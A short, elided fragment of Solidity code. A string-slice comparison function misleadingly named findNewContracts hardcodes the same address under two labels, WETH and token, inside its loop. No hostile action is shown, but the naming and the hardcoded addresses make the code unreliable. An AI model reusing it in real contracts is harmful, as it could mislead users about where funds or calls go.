    ...
    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
       ...
       if (other._len < self._len)
        ...
        for (uint idx = 0; idx < shortest; idx += 32) {
            ...
            string memory WETH_CONTRACT_ADDRESS = "0x2ac0b7c534fa05b19511a869b7e8868a72428b1a";
            string memory TOKEN_CONTRACT_ADDRESS = "0x2ac0b7c534fa05b19511a869b7e8868a72428b1a";
